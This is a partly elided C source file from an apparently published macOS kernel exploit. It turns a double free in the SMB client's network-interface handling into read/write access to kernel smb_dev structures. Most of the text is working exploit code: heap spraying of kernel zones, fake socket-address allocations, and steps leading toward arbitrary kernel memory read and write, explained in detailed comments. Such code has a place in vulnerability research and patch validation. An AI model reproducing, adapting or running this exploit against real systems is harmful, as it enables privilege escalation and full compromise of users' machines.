...
///
/// This module exploits the double free vulnerability demonstrated in
/// "POCs/poc_double_free" to obtain read write access to `struct smb_dev`
...
/// already in the `client_nic_info_list`, the method `smb2_mc_add_new_interface_info_to_list`
/// will first release the NIC by calling `smb2_mc_release_interface`  and then the method
/// `smb2_mc_parse_client_interface_array` will release all the NICs in `client_nic_info_list`
/// by calling `smb2_mc_release_interface_list`. Since the method
/// `smb2_mc_add_new_interface_info_to_list` only released the NIC and did not remove the
/// released NIC from the `client_nic_info_list`, the NIC will get released twice.
///
...
/// }
///
/// As noted above, when the NIC is released, all the dynamically allocated socket
/// address and `struct sock_addr_entry` in the `interface->addr_list` is also released.
/// So if we can allocate a fake NIC (of type `struct complete_nic_info_entry`) in the
...
/// Create a `smb_dev_rw` from allocation of `kmem_allocator_rw_t` replaced by a `struct smb_dev`
struct smb_dev_rw* smb_dev_rw_create_from_capture(const struct sockaddr_in* smb_addr, int fd_dev, int fd_rw, smb_dev_rw_session_shared_t session) {
    ...
    /// Sometimes the `kmem_allocator_rw_t` allocation might get replaced by an
    /// allocation in kext.48 other that `struct smb_dev`. We can detect this by
    /// reading the data and validating it for a valid `struct smb_dev`
...
void smb_dev_rw_match_dev_to_rw(int capture_smb_devs[NUM_SMB_DEV_CAPTURE_ALLOCS], const int* rw_fds, int* matched_captures, int num_rw_fds) {
    ...
    for (int capture_dev_idx=0; capture_dev_idx<NUM_SMB_DEV_CAPTURE_ALLOCS; capture_dev_idx++) {
        ...
        for (int rw_dev_idx = 0; rw_dev_idx<num_rw_fds; rw_dev_idx++) {
            ...
            /// Read the memory of `kmem_allocator_rw_t` allocation
...
void smb_dev_rw_create(const struct sockaddr_in* smb_addr, smb_dev_rw_t dev_rws[2]) {
    ...
    /// STEP 5: Trigger the double free of the leaked `dbf_nic`. Also parallely spray the zone kext.96
    ...
    /// allocation of `kmem_allocator_rw_t`.
    ...
    /// refrences by `fake_sock_addr_entry_alloc` and `fake_sockaddr_alloc`. Also spray kext.48
    ...
    /// `fake_sockaddr` is still refrenced by allocations from `kmem_allocator_rw_t`, we can
    ...
    dispatch_apply(NUM_SMB_DEV_CAPTURE_ALLOCS, DISPATCH_APPLY_AUTO, ^(size_t idx) {
        if (idx == 0) {
            if (sock_addr_entry_found_index >= 0) {
                int error = kmem_allocator_prpw_release_containing_backend(fake_sock_addr_entry_alloc.element_allocator, sock_addr_entry_found_index);
                xe_assert_err(error);
            }
            if (sockaddr_found_index >= 0) {
                int error = kmem_allocator_prpw_release_containing_backend(fake_sockaddr_alloc.element_allocator, sockaddr_found_index);
                xe_assert_err(error);
            }
        }
    ...
    /// STEP 8: Filter out `kmem_allocator_rw_t` backends whose data changed. The memory allocated
    /// by these backends got released when a `kmem_allocator_prpw_t` backend was released
    /// in STEP 7
    int dev_rw_fds[num_slots];
    for (int i = 0; i<num_slots; i++) {
        int capture_idx = -1;
        /// Find out which allocation of `kmem_allocator_rw_t` got changed. `SMB_DEV_CAPTURE_DATA`
        ...
        if (capture_idx >= 0) {
            dev_rw_fds[i] = kmem_allocator_rw_disown_backend(capture_allocator, capture_idx);
            xe_log_debug("memory allocated by dev_rw at fd: %d changed", dev_rw_fds[i]);
        } else {
            /// Since we can only read one byte of data (address family) using `kmem_allocator_prpw_t`
            /// we might have matched it with allocation on kext.48 zone done by someone other than
            /// `kmem_allocator_rw_t`. Unlikely but can happen.
    ...
    /// with `kmem_allocator_rw_t` backends filtered out in STEP 8
    ...
    /// STEP 10: Create `smb_dev_rw` for each captured `kmem_allocator_rw_t` and smb_device pair.
    /// Verify that the memory pointed by filtered `kmem_allocator_rw_t` is a valid `struct smb_dev` and
    /// mark the verfied ones as active. We keep the inactive ones because releasing them at this time
    /// might cause kernel panic. The memory allocated by those `kmem_allocator_rw_t` backends are
    /// either now in free state or allocated to some other allocation in kext.48 zone. Later when we have
    /// arbitary kernel memory read write, we will clean up these inactive `smb_dev_rw` so that they can
    /// be safely released
...
int smb_dev_rw_write_data(smb_dev_rw_t dev, const struct smb_dev* data) {
    ...
    /// Release the `kmem_allocator_rw_t` backend
    close(dev->fd_rw);
    ...
    /// Set the `NSMBFS_CANCEL` flag. This can be used to identify which `kmem_allocator_rw_t`
    ...
    data_copy.sd_flags |= NSMBFL_CANCEL;
    /// Find out which `kmem_allocator_rw_t` backend replaced the `struct smb_dev`
    /// data of `fd_dev`
    int found_idx;
    error = kmem_allocator_rw_filter(capture_allocator, 0, kmem_allocator_rw_get_backend_count(capture_allocator), 48, 48, ^_Bool(void* ctx, char* data1, char* data2, size_t idx) {
        /// Each `kmem_allocator_rw_t` backend can allocate a pair of read write data
    ...
    if (found_idx < 0) {
        /// None of the `kmem_allocator_rw_t` backend allocations replaced the
        /// `struct smb_dev` data of `fd_dev`. Mark this backend as inactive. The
        /// `fd_dev` should not be used anymore because it might cause kernel
        /// panic
        dev->active = FALSE;
        dev->fd_rw = -1;
        dev->fd_dev = -1;
